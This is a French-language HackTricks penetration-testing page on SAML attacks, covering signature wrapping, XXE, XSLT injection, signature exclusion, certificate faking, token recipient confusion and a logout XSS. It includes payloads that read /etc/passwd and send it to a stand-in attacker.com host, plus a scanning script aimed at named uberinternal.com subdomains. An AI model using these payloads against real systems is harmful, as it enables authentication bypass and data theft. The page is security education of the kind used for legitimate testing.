# SAML Attacks

## SAML Attacks

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Basic Information

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Tool

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) : Un outil qui peut prendre une URL ou une liste d'URL et renvoie l'URL de consommation SAML.

## XML round-trip

Dans XML, la partie sign√©e de l'XML est sauvegard√©e en m√©moire, puis un certain encodage/d√©codage est effectu√© et la signature est v√©rifi√©e. Id√©alement, cet encodage/d√©codage ne devrait pas changer les donn√©es, mais bas√© sur ce sc√©nario, **les donn√©es v√©rifi√©es et les donn√©es originales pourraient ne pas √™tre les m√™mes**.

Par exemple, v√©rifiez le code suivant :
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
Ex√©cuter le programme contre REXML 3.2.4 ou une version ant√©rieure donnerait plut√¥t le r√©sultat suivant :
```
First child in original doc: Y
First child after round-trip: Z
```
Voici comment REXML a vu le document XML original du programme ci-dessus :

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (1001).png>)

Et voici comment il l'a vu apr√®s un tour de parsing et de s√©rialisation :

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (445).png>)

Pour plus d'informations sur la vuln√©rabilit√© et comment en abuser :

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## Attaques par enveloppement de signature XML

Dans les **attaques par enveloppement de signature XML (XSW)**, les adversaires exploitent une vuln√©rabilit√© qui survient lorsque les documents XML sont trait√©s √† travers deux phases distinctes : **validation de signature** et **invocation de fonction**. Ces attaques impliquent de modifier la structure du document XML. Plus pr√©cis√©ment, l'attaquant **injecte des √©l√©ments falsifi√©s** qui ne compromettent pas la validit√© de la signature XML. Cette manipulation vise √† cr√©er une discordance entre les √©l√©ments analys√©s par la **logique d'application** et ceux v√©rifi√©s par le **module de v√©rification de signature**. En cons√©quence, bien que la signature XML reste techniquement valide et passe la v√©rification, la logique d'application traite les **√©l√©ments frauduleux**. Par cons√©quent, l'attaquant contourne efficacement la **protection d'int√©grit√©** et **l'authentification d'origine** de la signature XML, permettant l'**injection de contenu arbitraire** sans d√©tection.

Les attaques suivantes sont bas√©es sur [**cet article de blog**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **et** [**ce document**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf). Consultez-les pour plus de d√©tails.

### XSW #1

* **Strat√©gie** : Un nouvel √©l√©ment racine contenant la signature est ajout√©.
* **Implication** : Le validateur peut √™tre confus entre le "Response -> Assertion -> Subject" l√©gitime et le "mauvais nouveau Response -> Assertion -> Subject" de l'attaquant, entra√Ænant des probl√®mes d'int√©grit√© des donn√©es.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (506).png>)

### XSW #2

* **Diff√©rence par rapport √† XSW #1** : Utilise une signature d√©tach√©e au lieu d'une signature enveloppante.
* **Implication** : La structure "malveillante", similaire √† XSW #1, vise √† tromper la logique m√©tier apr√®s la v√©rification d'int√©grit√©.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (466).png>)

### XSW #3

* **Strat√©gie** : Une assertion malveillante est cr√©√©e au m√™me niveau hi√©rarchique que l'assertion originale.
* **Implication** : Vise √† tromper la logique m√©tier pour qu'elle utilise les donn√©es malveillantes.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (120).png>)

### XSW #4

* **Diff√©rence par rapport √† XSW #3** : L'assertion originale devient un enfant de l'assertion dupliqu√©e (malveillante).
* **Implication** : Semblable √† XSW #3 mais modifie la structure XML de mani√®re plus agressive.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (551).png>)

### XSW #5

* **Aspect unique** : Ni la signature ni l'assertion originale ne respectent les configurations standard (envelopp√©es/enveloppantes/d√©tach√©es).
* **Implication** : L'assertion copi√©e enveloppe la signature, modifiant la structure de document attendue.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (1030).png>)

### XSW #6

* **Strat√©gie** : Insertion √† un emplacement similaire √† XSW #4 et #5, mais avec une variation.
* **Implication** : L'assertion copi√©e enveloppe la signature, qui enveloppe ensuite l'assertion originale, cr√©ant une structure trompeuse imbriqu√©e.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (169).png>)

### XSW #7

* **Strat√©gie** : Un √©l√©ment Extensions est ins√©r√© avec l'assertion copi√©e comme enfant.
* **Implication** : Cela exploite le sch√©ma moins restrictif de l'√©l√©ment Extensions pour contourner les contre-mesures de validation de sch√©ma, en particulier dans des biblioth√®ques comme OpenSAML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (971).png>)

### XSW #8

* **Diff√©rence par rapport √† XSW #7** : Utilise un autre √©l√©ment XML moins restrictif pour une variante de l'attaque.
* **Implication** : L'assertion originale devient un enfant de l'√©l√©ment moins restrictif, inversant la structure utilis√©e dans XSW #7.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (541).png>)

### Outil

Vous pouvez utiliser l'extension Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) pour analyser la requ√™te, appliquer toute attaque XSW de votre choix et la lancer.

## XXE

Si vous ne savez pas quel type d'attaques sont les XXE, veuillez lire la page suivante :

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

Les r√©ponses SAML sont des **documents XML d√©compress√©s et encod√©s en base64** et peuvent √™tre susceptibles aux attaques d'entit√© externe XML (XXE). En manipulant la structure XML de la r√©ponse SAML, les attaquants peuvent tenter d'exploiter les vuln√©rabilit√©s XXE. Voici comment une telle attaque peut √™tre visualis√©e :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Outils

Vous pouvez √©galement utiliser l'extension Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) pour g√©n√©rer le POC √† partir d'une requ√™te SAML afin de tester d'√©ventuelles vuln√©rabilit√©s XXE et vuln√©rabilit√©s SAML.

V√©rifiez √©galement cette conf√©rence : [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

Pour plus d'informations sur XSLT, allez √† :

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

Les Transformations de Langage de Feuille de Style Extensible (XSLT) peuvent √™tre utilis√©es pour transformer des documents XML en divers formats comme HTML, JSON ou PDF. Il est crucial de noter que **les transformations XSLT sont effectu√©es avant la v√©rification de la signature num√©rique**. Cela signifie qu'une attaque peut r√©ussir m√™me sans une signature valide ; une signature auto-sign√©e ou invalide suffit pour proc√©der.

Ici, vous pouvez trouver un **POC** pour v√©rifier ce type de vuln√©rabilit√©s, sur la page hacktricks mentionn√©e au d√©but de cette section, vous pouvez trouver des payloads.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Outil

Vous pouvez √©galement utiliser l'extension Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) pour g√©n√©rer le POC √† partir d'une requ√™te SAML afin de tester d'√©ventuelles vuln√©rabilit√©s XSLT.

V√©rifiez √©galement cette conf√©rence : [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## Exclusion de la signature XML <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

L'**Exclusion de la signature XML** observe le comportement des impl√©mentations SAML lorsque l'√©l√©ment Signature est absent. Si cet √©l√©ment est manquant, **la validation de la signature peut ne pas se produire**, rendant le syst√®me vuln√©rable. Il est possible de tester cela en modifiant les contenus qui sont g√©n√©ralement v√©rifi√©s par la signature.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (457).png>)

### Outil <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

Vous pouvez √©galement utiliser l'extension Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e). Interceptez la r√©ponse SAML et cliquez sur `Remove Signatures`. Ce faisant, **tous** les √©l√©ments Signature sont supprim√©s.

Avec les signatures supprim√©es, laissez la requ√™te se poursuivre vers la cible. Si la signature n'est pas requise par le Service

## Falsification de certificat <a href="#certificate-faking" id="certificate-faking"></a>

## Falsification de certificat

La falsification de certificat est une technique pour tester si un **Fournisseur de services (SP) v√©rifie correctement qu'un message SAML est sign√©** par un fournisseur d'identit√© (IdP) de confiance. Cela implique d'utiliser un \***certificat auto-sign√©** pour signer la r√©ponse ou l'assertion SAML, ce qui aide √† √©valuer le processus de validation de confiance entre le SP et l'IdP.

### Comment r√©aliser la falsification de certificat

Les √©tapes suivantes d√©crivent le processus en utilisant l'extension Burp [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) :

1. Interceptez la r√©ponse SAML.
2. Si la r√©ponse contient une signature, envoyez le certificat √† SAML Raider Certs en utilisant le bouton `Send Certificate to SAML Raider Certs`.
3. Dans l'onglet Certificats de SAML Raider, s√©lectionnez le certificat import√© et cliquez sur `Save and Self-Sign` pour cr√©er un clone auto-sign√© du certificat original.
4. Retournez √† la requ√™te intercept√©e dans le Proxy de Burp. S√©lectionnez le nouveau certificat auto-sign√© dans le menu d√©roulant de la signature XML.
5. Supprimez toutes les signatures existantes avec le bouton `Remove Signatures`.
6. Signez le message ou l'assertion avec le nouveau certificat en utilisant le bouton **`(Re-)Sign Message`** ou **`(Re-)Sign Assertion`**, selon le cas.
7. Transmettez le message sign√©. Une authentification r√©ussie indique que le SP accepte les messages sign√©s par votre certificat auto-sign√©, r√©v√©lant d'√©ventuelles vuln√©rabilit√©s dans le processus de validation des messages SAML.

## Confusion du destinataire de jeton / Confusion de cible de fournisseur de services <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

La confusion du destinataire de jeton et la confusion de cible de fournisseur de services impliquent de v√©rifier si le **Fournisseur de services valide correctement le destinataire pr√©vu d'une r√©ponse**. En essence, un Fournisseur de services devrait rejeter une r√©ponse d'authentification si elle √©tait destin√©e √† un autre fournisseur. L'√©l√©ment critique ici est le champ **Recipient**, trouv√© dans l'√©l√©ment **SubjectConfirmationData** d'une r√©ponse SAML. Ce champ sp√©cifie une URL indiquant o√π l'assertion doit √™tre envoy√©e. Si le destinataire r√©el ne correspond pas au Fournisseur de services pr√©vu, l'assertion doit √™tre consid√©r√©e comme invalide.

#### **Comment cela fonctionne**

Pour qu'une attaque de confusion de destinataire de jeton SAML (SAML-TRC) soit r√©alisable, certaines conditions doivent √™tre remplies. Tout d'abord, il doit y avoir un compte valide sur un Fournisseur de services (appel√© SP-L√©gitime). Deuxi√®mement, le Fournisseur de services cibl√© (SP-Cible) doit accepter des jetons du m√™me fournisseur d'identit√© qui sert SP-L√©gitime.

Le processus d'attaque est simple dans ces conditions. Une session authentique est initi√©e avec SP-L√©gitime via le fournisseur d'identit√© partag√©. La r√©ponse SAML du fournisseur d'identit√© √† SP-L√©gitime est intercept√©e. Cette r√©ponse SAML intercept√©e, initialement destin√©e √† SP-L√©gitime, est ensuite redirig√©e vers SP-Cible. Le succ√®s de cette attaque est mesur√© par l'acceptation de l'assertion par SP-Cible, accordant l'acc√®s aux ressources sous le m√™me nom de compte utilis√© pour SP-L√©gitime.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS dans la fonctionnalit√© de d√©connexion

La recherche originale peut √™tre consult√©e via [ce lien](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/).

Au cours du processus de brute forcing de r√©pertoire, une page de d√©connexion a √©t√© d√©couverte √† :
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Lors de l'acc√®s √† ce lien, une redirection s'est produite vers :
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Cela a r√©v√©l√© que le param√®tre `base` accepte une URL. En tenant compte de cela, l'id√©e est n√©e de substituer l'URL par `javascript:alert(123);` dans une tentative d'initier une attaque XSS (Cross-Site Scripting).

### Exploitation de masse

[√Ä partir de cette recherche](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

L'outil [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) a √©t√© utilis√© pour analyser les sous-domaines de `uberinternal.com` pour les domaines utilisant la m√™me biblioth√®que. Par la suite, un script a √©t√© d√©velopp√© pour cibler la page `oidauth/prompt`. Ce script teste pour XSS (Cross-Site Scripting) en saisissant des donn√©es et en v√©rifiant si elles sont refl√©t√©es dans la sortie. Dans les cas o√π l'entr√©e est effectivement refl√©t√©e, le script signale la page comme vuln√©rable.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## R√©f√©rences

* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
